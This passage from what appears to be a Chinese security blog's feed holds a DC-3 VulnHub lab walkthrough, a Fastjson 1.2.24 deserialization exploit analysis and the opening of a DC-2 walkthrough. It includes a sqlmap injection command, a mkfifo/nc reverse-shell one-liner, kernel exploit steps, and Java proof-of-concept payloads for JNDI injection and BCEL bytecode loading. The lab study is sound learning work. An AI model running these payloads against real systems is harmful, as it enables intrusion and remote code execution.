src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/3.png" class><p>本靶场只有最终的flag。</p><h2 id="寻找最终flag"><a href="#寻找最终flag" class="headerlink" title="寻找最终flag"></a>寻找最终flag</h2><h4 id="joomscan扫描后台地址"><a href="#joomscan扫描后台地址" class="headerlink" title="joomscan扫描后台地址"></a>joomscan扫描后台地址</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Joomla 是一种流行的开源内容管理系统（CMS），用于构建和管理网站。它是一个基于 PHP 和 MySQL 的平台，提供了丰富的功能和灵活性，使用户能够创建各种类型的网站。Joomla 提供了一个易于使用的管理界面，使用户能够管理网站的内容、布局和功能。它支持扩展和模块化的体系结构，通过使用扩展和插件，用户可以轻松地添加新功能、模板和扩展来满足他们的需求。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JoomScan 是一款用于检测 Joomla 网站漏洞的开源工具。它是专门为 Joomla CMS 设计的渗透测试工具，旨在帮助安全专业人员发现和评估 Joomla 网站中的安全漏洞。它可以探测常见的web漏洞，joomla特定的CMS漏洞，插件和组件的漏洞，当然也可以扫描后台地址，当然也可以使用Nikto，它也是一款开源的漏洞扫描工具。</span><br></pre></td></tr></table></figure><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/4.png" class><p>扫描到后台地址，另外探测出joomla的版本是3.7.0</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5.png" class><h4 id="Searchsploit探测CMS相关漏洞"><a href="#Searchsploit探测CMS相关漏洞" class="headerlink" title="Searchsploit探测CMS相关漏洞"></a>Searchsploit探测CMS相关漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Searchsploit 是一款用于在本地漏洞利用数据库中搜索已知漏洞的命令行工具，Searchsploit 使用本地存储的漏洞利用数据库，其中包含大量已公开披露的漏洞和利用代码。当你使用 Searchsploit 时，它会在本地数据库中搜索指定的关键词，并返回与该关键词相关的漏洞、漏洞描述、利用代码和参考资料等信息。用它可以搜索joomla当代版本的CMS漏洞。</span><br></pre></td></tr></table></figure><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/6.png" class><p>有sql注入和xss，sql注入才最具有利用价值，查看txt有漏洞利用payload，注意路径拼接：</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/7.png" class><p>有漏洞测试的url，还有sqlmap注入的命令，使用该url测试一下sql注入漏洞是否存在。</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/8.png" class><p>报错了，说明后端有sql语句拼接，此处存在漏洞。</p><h4 id="sqlmap注出管理员密码"><a href="#sqlmap注出管理员密码" class="headerlink" title="sqlmap注出管理员密码"></a>sqlmap注出管理员密码</h4><p>爆库命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.47.137/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/9.png" class><p>接下来就找管理员密码，查表啥的省略，直接放最后一张截图；</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/10.png" class><p>admin的密码是由hash加密过的。</p><h4 id="john破解管理员密码"><a href="#john破解管理员密码" class="headerlink" title="john破解管理员密码"></a>john破解管理员密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">John the Ripper（通常简称为John）是一款用于密码破解和恢复的开源软件。它被广泛用于渗透测试和密码安全评估等领域。 能够使用多种密码破解技术，包括暴力破解、字典攻击和彩虹表攻击等。它支持多种密码哈希算法和格式，例如MD5、SHA1、DES、NTLM等。通过利用多种破解技术和灵活的配置选项，John 可以尝试恢复密码或破解加密哈希值。目前来说不需要知道原理，知道怎么用工具就行。</span><br></pre></td></tr></table></figure><p>把管理员的Hash值放在一个txt文件里，再使用john工具爆破。</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/11.png" class><p>因为我之前已经爆破过了，使用命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --show 123.txt</span><br></pre></td></tr></table></figure><p>可以查看明文。</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/12.png" class><p>所以管理员的密码为snoopy。成功登录到后台。</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/13.png" class><h4 id="上传木马getshell"><a href="#上传木马getshell" class="headerlink" title="上传木马getshell"></a>上传木马getshell</h4><p>进入到管理员后台，下一步应该想想怎么getshell了。找的上传的点有两三个，能利用，上传成功的点应该在这</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/14.png" class><p>我们可以任意添加，修改，删除，上传任意文件，在此目录下。该目录不是web根目录，它的路径在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">templates/beez3/</span><br></pre></td></tr></table></figure><p>添加一个123.php，写上一句话木马：</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/15.png" class><p>蚁剑连接成功</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/16.png" class><p>蚁剑的虚拟终端不太好用，那么反弹shell到kali机上。</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/17.png" class><p>虚拟终端使用以下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.47.138 9955 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>因为虚拟终端没有参数-e，常规的反弹shell用不了。那么就使用linux的无-e参数的反弹shell。mkfifo 命令首先创建了一个命令管道，nc与kali机建立socket连接，kali机上输入的命令将输入重定向到命令管道，cat &#x2F;tmp&#x2F;f查看该命令管道里的内容，并且作为&#x2F;bin&#x2F;sh的输入，交互式shell，执行kali机输入的命令，2&gt;&amp;1将标准输出和标准错误输出传递给nc，然后回显到我们的kali机上，形成一个回路。这篇文章讲的比较好：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_43873557/article/details/113760881</span><br></pre></td></tr></table></figure><p>又带我熟悉了一下反弹shell的原理。</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/18.png" class><p>使用命令优化一下shell</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/19.png" class><p>很明显不是root权限，root目录进不去，最后的flag应该就在root目录下了，看来是得提权了。</p><h4 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h4><p>上传提权辅助脚本发现提权漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux_Exploit_Suggester是一款根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</span><br></pre></td></tr></table></figure><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20.png" class><p>记得给上传的脚本加执行权限，运行脚本，有很多用于提权的CVE。我们使用这个漏洞进行提权</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/21.png" class><p>该url可以下载一个zip文件，这个文件就是用于提权的文件。也可以去searchsploit里面去查找，它本身也就是一个漏洞利用的数据库。</p><p>上传这个39772.zip</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/22.png" class><p>解压该文件，执行里面的脚本进行提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip 39772.zip</span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><p>提权成功了，角色由www-data转变为root。</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/23.png" class><p>进入到root目录，拿取到本靶机唯一的flag。</p><img src="/2023/07/17/DC-3%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/24.png" class><p>本靶机通关结束。</p>]]></content>
      
      
      <categories>
          
          <category> 打靶记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson反序列化-1.2.24漏洞利用与分析</title>
      <link href="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h2><p>通过上一篇文章对fastjson基础知识的学习和反序列化流程的分析，发现它与我们之前学的常规的反序列化又不太一样。fastjson自己定义了一套反序列化规则，它不需要反序列化的类去继承Serializable接口，也不需要找readObject函数作为入口。相反，它是将类中的setter和满足特定条件的getter方法作为出发点，@type所指向的全类名必须能够找到就可以反序列化成功。总的来说，从原生反序列化中的属性可控到寻找setter或者getter方法可控。（ps：这点很重要）</p><p>本篇文章主要学习两种利用方法，出网和不出网。</p><h2 id="0x02-出网-JNDI注入"><a href="#0x02-出网-JNDI注入" class="headerlink" title="0x02 出网+JNDI注入"></a>0x02 出网+JNDI注入</h2><h3 id="利用类：JdbcRowSetImpl"><a href="#利用类：JdbcRowSetImpl" class="headerlink" title="利用类：JdbcRowSetImpl"></a>利用类：JdbcRowSetImpl</h3><p>该类有一块JNDI注入的代码逻辑：</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/1.png" class><p>代码是反编译出来的，但是不影响。conn属性默认为空，不用管自然会走到else if。getDataSourceName是getter方法，</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/2.png" class><p>它的返回值我们可控，就可以实现JNDI注入。那么接下来就是寻找哪个getter或者setter方法调用了connect方法，查找用法全局搜索，在本类中是有两处。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/3.png" class><p>我们用setAutoCommit方法，</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/4.png" class><p>接收一个布尔型的参数，conn默认为空，自然会调用到connect方法。那可不可以用前面的getter方法，Fastjson基础篇讲到parse方法里会执行返回值类型为Map等特定的getter方法。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/5.png" class><p>而它的返回值只是一个普通的接口，不满足条件。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/6.png" class><p>但是在下面的toJSON会遍历执行所有的getter（基础篇没有写，文章最后会分析一下），前提是上面的代码不会出错，自己可以调一下，是会出错的。到此整个利用流程结束，将setAutoCommit作为入口，getDataSourceName作为输入实现JNDI注入。</p><p>使用工具Yakit起一个恶意的ldap服务，里面放着恶意类，很方便。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/7.png" class><p>最终POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPOC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8086/LrcaDhze\&quot;,\&quot;autoCommit\&quot;:\&quot;false\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很简单，也不需要去过多的分析。感兴趣也可以自己调试一下。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/8.png" class><h2 id="0x03-不出网-动态加载字节码"><a href="#0x03-不出网-动态加载字节码" class="headerlink" title="0x03 不出网+动态加载字节码"></a>0x03 不出网+动态加载字节码</h2><p>JNDI注入实现的是远程类加载，这种利用方法主要实现本地类加载。需要相关tomcat的依赖</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/9.png" class><h3 id="利用类：ClassLoader"><a href="#利用类：ClassLoader" class="headerlink" title="利用类：ClassLoader"></a>利用类：ClassLoader</h3><p>需要注意的是，它不是java.lang下的类加载器，它是继承于原生的ClassLoader，在包com.sun.org.apache.bcel.internal.util下。</p><p>利用方法loadClass，</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/10.png" class><p>defineClass最终实现类加载。class_name是传进来的参数，我们需要让它走到第一个if分支里，不然是会抛出异常的，跟进到createClass方法，</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/11.png" class><p>看逻辑，我们传进去的串前面必须满足$$BCEL$$八个字符，进入到这个函数后会对第八个字符后面的串解码并返回，所以我们只需要将字节码编码，前面加上$$BCEL$$标记符就好了。</p><p>接下来就是如何调用到这个loadClass方法了。这就需要前面说的tomcat依赖里的类了：BasicDataSource。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/12.png" class><p>在createConnectionFactory方法里，利用的地方是第二个Class.forName，用于通过类的全限定名来加载和获取对应的 Class对象，该方法像图中所说，有三个参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数一：类的全限定名，用于获取它的Class对象。</span><br><span class="line">参数二：布尔型，为true时，在类加载的时候会进行初始化。</span><br><span class="line">参数三：选择指定的类加载器。</span><br></pre></td></tr></table></figure><p>能够指定任意的类加载器，那就与开头的loadClass方法对接上了，代码中第二个参数为true，会进行初始化。动态类加载的两个条件满足，能够执行恶意代码。</p><p>现在需要的是driverClassName和driverClassLoader属性是否可控，可控的前提是是否存在对应的getter和setter方法。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/13.png" class><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/14.png" class><p>查找用法很容易就能找到，（也有对应的setter，没放截图而已）那么接下来就是要找哪个getter或者setter方法调用了createConnectionFactory，这里找两层就能找得到了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">createConnectionFactory-》createDataSource-》getConnection</span><br></pre></td></tr></table></figure><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/15.png" class><p>到此整个流程分析结束。恶意类代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evaltest</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>包名应该得一样，之前用不一样包名的字节码文件弹不出计算器。可以写一个普通的代码逻辑。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\tmp\\classes\\Evaltest.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">basicDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();</span><br><span class="line">        basicDataSource.setDriverClassLoader(classLoader);</span><br><span class="line">        basicDataSource.setDriverClassName(<span class="string">&quot;$$BCEL$$&quot;</span>+s);</span><br><span class="line">        basicDataSource.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要控制的属性也就两个，一个是要加载的字节码，另一个是类加载器。代码逻辑前面都说过了，很容易能看懂了。运行也是可以弹出计算器，最后写一个最终的fastjson反序列化的payload：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\tmp\\classes\\Evaltest.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;DriverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+s+<span class="string">&quot;\&quot;,\&quot;DriverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(code);</span><br></pre></td></tr></table></figure><p>成功弹出计算器。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/16.png" class><h2 id="0x04-toJSON方法遍历所有getter的分析"><a href="#0x04-toJSON方法遍历所有getter的分析" class="headerlink" title="0x04 toJSON方法遍历所有getter的分析"></a>0x04 toJSON方法遍历所有getter的分析</h2><p>算是补的基础的坑，但是不会说太细，知道就好。</p><p>下断点调试吧，以第二个利用代码作为例子。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/17.png" class><p>对BasicDataSource类所继承的类的做个判断，这里都不是，直接跳过。又开始判断BasicDataSource对象的类型了。这里也都不是，</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/18.png" class><p>跟进到getFieldValuesMap方法里面。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/19.png" class><p>遍历所有的getter方法，然后将它们对应的字段的值储存在Map中。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/20.png" class><p>当遍历到getConnection方法时，跟进getPropertyValue方法，继续跟进到get方法。</p><img src="/2023/07/14/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-24%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/21.png" class><p>动态调用函数，成功调用getConnection方法，作为反序列化的开头，继续跟进的话也就回到刚才利用分析的地方。到此就结束。</p><h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05 结语"></a>0x05 结语</h2><p>Fastjson的1.2.24版本是最先发现漏洞的版本，这篇文章也是作为学习Fastjson反序列化的开端。后续会继续学习Fastjson高版本的绕过。</p><p>反序列化之路任重而道远。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2靶机通关记录</title>
      <link href="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><blockquote><p>局域网网段：192.168.47.0&#x2F;24</p><p>攻击机 kali：192.168.47.128&#x2F;24</p><p>目标器 DC-2：192.168.47.136&#x2F;24</p></blockquote><h3 id="打靶目标"><a href="#打靶目标" class="headerlink" title="打靶目标"></a>打靶目标</h3><blockquote><p>找到藏在DC-2靶机中的五个flag。</p></blockquote><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>已知目标机器和攻击机器在同一个局域网内，网段为192.168.47.0&#x2F;24。</p><h4 id="寻找靶机真实IP"><a href="#寻找靶机真实IP" class="headerlink" title="寻找靶机真实IP"></a>寻找靶机真实IP</h4><p>同样使用nmap扫描网段内的ip，使用命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.47.0/24</span><br><span class="line">-sP参数常用于发现主机，而不进行端口扫描，使用ping，也就是发送icmp数据包，探测ip段内的主机是否在线</span><br></pre></td></tr></table></figure><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/1.png" class><p>第一个为网关地址，192.168.47.128为本kali机地址，那么192.168.47.136就是目标机器地址了。</p><h4 id="探测服务以及端口"><a href="#探测服务以及端口" class="headerlink" title="探测服务以及端口"></a>探测服务以及端口</h4><p>nmap使用命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- -v 192.168.47.136/24</span><br><span class="line">-A表示全面扫描，包括端口，服务，操作系统等等。-p-是扫描主机开放的全部端口，而不只是常见的端口。-v就是显示更详细的扫描结果和信息。</span><br></pre></td></tr></table></figure><img src="/2023/07/13/DC-2%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2.png" class><p>目标靶机开放了80端口的web服务和7744端口的ssh，7744端口并不是ssh的常见端口。</p><h3 id="寻找flag"><a href="#寻找flag" class="headerlink" title="寻找flag"></a>寻找flag</h3><h4 id="获取flag1"><a href="#获取flag1" class="headerlink" title="获取flag1"></a>获取flag1</h4><p>扫描到目标靶机开放了web服务，游览器访问靶机ip，跳转到域名：<a 